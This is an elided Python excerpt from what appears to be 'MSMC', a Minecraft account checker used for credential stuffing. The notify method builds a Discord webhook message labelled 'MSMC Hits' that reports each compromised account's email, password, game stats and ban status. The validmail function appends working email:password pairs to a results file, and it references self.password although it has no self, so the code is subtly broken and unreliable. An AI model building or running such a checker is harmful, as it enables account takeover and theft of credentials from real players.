    ...
    def notify(self):
        ...
        try:
            ...
            if config.get('embed'):
                payload = {
                    "username": "MSMC Hits 🔥",
                    "avatar_url": "https://media.tenor.com/isi6vBqLBw0AAAAi/background-remove.gif",
                    "embeds": [{
                        "author": {"name": "MSMC", "url": "https://example.com", "icon_url": "https://media.tenor.com/isi6vBqLBw0AAAAi/background-remove.gif"},
                        "title": self.name,
                        "color": 0x232CF7,
                        "fields": [
                            {"name": "Eᴍᴀɪʟ", "value": f"||{self.email}||", "inline": True},
                            {"name": "Pᴀssᴡᴏʀᴅ", "value": f"||{self.password}||", "inline": True},
                            {"name": "Aᴄᴄᴏᴜɴᴛ Tʏᴘᴇ", "value": f"{self.type or 'Unknown'}", "inline": True},
                            {"name": "Hʏᴘɪxᴇʟ", "value": self.hypixl or "N/A", "inline": True},
                            {"name": "Hʏᴘɪxᴇʟ Lᴇᴠᴇʟ", "value": self.level or "N/A", "inline": True},
                            {"name": "Fɪʀsᴛ Lᴏɢɪɴ", "value": self.firstlogin or "N/A", "inline": True},
                            {"name": "Lᴀsᴛ Lᴏɢɪɴ", "value": self.lastlogin or "N/A", "inline": True},
                            {"name": "Oᴘᴛɪғɪɴᴇ Cʟᴏᴀᴋ", "value": f"{self.cape or 'No'}", "inline": True},
                            {"name": "Mɪɴᴇᴄʀᴀғᴛ Cʟᴏᴀᴋs", "value": f"{self.capes or 'None'}", "inline": True},
                            {"name": "Eᴍᴀɪʟ Aᴄᴄᴇss", "value": self.access or "N/A", "inline": True},
                            {"name": "Sᴋʏʙʟᴏᴄᴋ Cᴏɪɴs", "value": self.sbcoins or "N/A", "inline": True},
                            {"name": "Bᴇᴅᴡᴀʀs Sᴛᴀʀs", "value": self.bwstars or "N/A", "inline": True},
                            {"name": "Rᴇɴᴀᴍᴇᴀʙʟᴇ", "value": self.namechanged or "Unknown", "inline": True},
                            {"name": "Lᴀsᴛ Nᴀᴍᴇ Cʜᴀɴɢᴇ", "value": self.lastchanged or "N/A", "inline": True},
                            {"name": "Bᴀɴɴᴇᴅ Sᴛᴀᴛᴜs", "value": f"{self.banned or 'Unknown'}", "inline": True},
                        ],
                        "thumbnail": {"url": f"https://visage.surgeplay.com/bust/{self.name}?y=-40&quality=lossless"},
                        "footer": {"text": "Generated By MSMC"}
                    }]
                }
            else:
                payload = {
...
def validmail(email, password):
    ...
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{self.password}\n")
